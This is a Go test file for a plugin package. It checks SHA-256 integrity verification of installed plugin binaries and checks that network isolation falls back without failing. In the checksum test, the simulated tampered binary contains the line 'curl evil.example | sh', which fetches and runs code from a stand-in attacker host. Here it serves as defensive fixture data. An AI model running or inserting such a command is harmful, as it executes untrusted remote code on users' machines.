package plugin

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestVerifyChecksum(t *testing.T) {
	dir := t.TempDir()
	bin := filepath.Join(dir, "plugin.sh")
	if err := os.WriteFile(bin, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	sum, err := fileSHA256(bin)
	if err != nil {
		t.Fatal(err)
	}

	// Unpinned manifests stay valid (backward compatible).
	if err := verifyChecksum(bin, ""); err != nil {
		t.Errorf("empty checksum should pass, got %v", err)
	}
	// Correct digest passes, with or without the sha256: prefix.
	if err := verifyChecksum(bin, sum); err != nil {
		t.Errorf("matching checksum should pass, got %v", err)
	}
	if err := verifyChecksum(bin, "sha256:"+strings.ToUpper(sum)); err != nil {
		t.Errorf("prefixed/uppercase checksum should pass, got %v", err)
	}

	// Tampering with the binary after install must be detected.
	if err := os.WriteFile(bin, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	err = verifyChecksum(bin, sum)
	if err == nil {
		t.Fatal("expected tampered binary to fail the integrity check")
	}
	if !strings.Contains(err.Error(), "integrity check") {
		t.Errorf("unexpected error text: %v", err)
	}
}

// applyNetworkIsolation must never hard-fail: when the platform cannot enforce
// isolation it returns the command unchanged (with a warning), which is the
// regression that sank PR #255.
func TestApplyNetworkIsolation_NeverHardFails(t *testing.T) {
	// network allowed → command untouched.
	bin, args := applyNetworkIsolation("p", "/usr/bin/tool", true)
	if bin != "/usr/bin/tool" || len(args) != 0 {
		t.Errorf("network:true should pass the command through, got %q %v", bin, args)
	}

	// network denied → either wrapped (Linux w/ userns) or passed through with a
	// warning. Both are valid; what matters is that we get a runnable command.
	bin, args = applyNetworkIsolation("p", "/usr/bin/tool", false)
	if bin == "" {
		t.Fatal("expected a runnable binary, got empty string")
	}
	if bin == "/usr/bin/tool" {
		if len(args) != 0 {
			t.Errorf("pass-through should have no extra args, got %v", args)
		}
		return // platform can't isolate — acceptable, warning was logged
	}
	// Wrapped form: the real executable must be the final argument.
	if runtime.GOOS != "linux" {
		t.Errorf("unexpected isolation wrapper on %s: %q", runtime.GOOS, bin)
	}
	if len(args) == 0 || args[len(args)-1] != "/usr/bin/tool" {
		t.Errorf("wrapped command must end with the executable, got %q %v", bin, args)
	}
}
